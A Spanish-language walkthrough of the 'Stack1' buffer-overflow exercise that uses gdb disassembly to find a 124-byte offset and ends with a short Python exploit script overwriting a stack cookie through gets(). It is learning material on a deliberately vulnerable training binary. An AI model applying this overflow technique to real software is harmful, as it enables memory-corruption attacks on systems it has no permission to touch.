@@ -1,0 +1,72 @@
+Stack1 by k0ch // 1ero junio 2016
+
+Entorno: Xubuntu x86_64
+
+En primer lugar, al ejecutar el programa recibimos información que nos puede resultar bastante útil:
+buf: 0d8b54c0 cookie: 0d8b553c
+
+Con cada ejecución nos van a aparecer diferentes direcciones, pero no debemos fijarnos en eso, sino en la diferencia 
+que hay entre ambas (o la distancia en memoria) la cual se va a mantener constante: 
+0d8b553c - 0d8b54c0 = 7C (124 en decimal)
+
+Esta será la distancia en memoria que tenemos entre el buffer, y la cookie. Esto mismo podemos corroborarlo cuando 
+hacemos el disassembly. En mi caso utilicé gdb + peda (una buena explicación de como hacer andar peda aquí: 
+http://security.cs.pub.ro/hexcellents/wiki/kb/toolset/peda)
+
+//---------------------
+
+Dump of assembler code for function main:
+   0x00000000004005c0 <+0>:	push   rbp
+   0x00000000004005c1 <+1>:	mov    rbp,rsp
+   0x00000000004005c4 <+4>:	add    rsp,0xffffffffffffff80
+   0x00000000004005c8 <+8>:	lea    rdx,[rbp-0x4]  <---- Los dos señalados son "buf" y "cookie", que van a ser 
+							    cargados para ser usados como parámetros de printf
+   0x00000000004005cc <+12>:	lea    rax,[rbp-0x80] <---- Observen la distancia entre 0x80 y 0x4: 7C (124)
+   0x00000000004005d0 <+16>:	mov    rsi,rax
+   0x00000000004005d3 <+19>:	mov    edi,0x4006a0
+   0x00000000004005d8 <+24>:	mov    eax,0x0
+   0x00000000004005dd <+29>:	call   0x400490 <printf@plt>
+   0x00000000004005e2 <+34>:	lea    rax,[rbp-0x80] 
+   0x00000000004005e6 <+38>:	mov    rdi,rax
+   0x00000000004005e9 <+41>:	call   0x4004c0 <gets@plt> <---- Escribiremos "buf" con nuestro string mágico 
+								 a través de stdin ;)
+   0x00000000004005ee <+46>:	mov    eax,DWORD PTR [rbp-0x4]
+   0x00000000004005f1 <+49>:	cmp    eax,0x51525354 <---- El programa compara el valor que escribimos en 
+							    "cookie" a través de la sobrecarga de "buf"
+   0x00000000004005f6 <+54>:	jne    0x400602 <main+66>
+   0x00000000004005f8 <+56>:	mov    edi,0x4006b8
+   0x00000000004005fd <+61>:	call   0x400480 <puts@plt>
+   0x0000000000400602 <+66>:	leave  
+   0x0000000000400603 <+67>:	ret    
+End of assembler dump.
+
+//---------------------
+
+Vamos a detenerlos un poco en la comparación. Para que el programa nos lleve a nuestro deseado payload, debemos 
+hacer coincidir la comparación de "cookie" con 0x51525354. Para saber de que caracteres se tratan, llevamos el hex 
+a una calculadora de ascii (https://www.branah.com/ascii-converter), resultando en los siguientes caracteres:
+0x51525354 = QRST
+
+Como se trata de memoria little endian debemos leer al revés los caracteres, resultando:
+TSRQ
+
+Ya tenemos casi todo lo necesario, debemos llenar "buf" con 124 caracteres y luego escribir TSRQ para obtener 
+el payload! El siguiente script de python puede ayudar para tal fin:
+
+//---------------------
+
+import os
+StdIn,StdOut = os.popen4(r"./stack1-x86_64.elf")
+
+XploitString = "x" * 124 + "TSRQ" + '\n'
+print XploitString
+
+StdIn.write(XploitString)
+StdIn.close()
+
+print StdOut.read()
+
+//---------------------
+
+SEE YOU SPACE COWBOY :)
+..k0ch
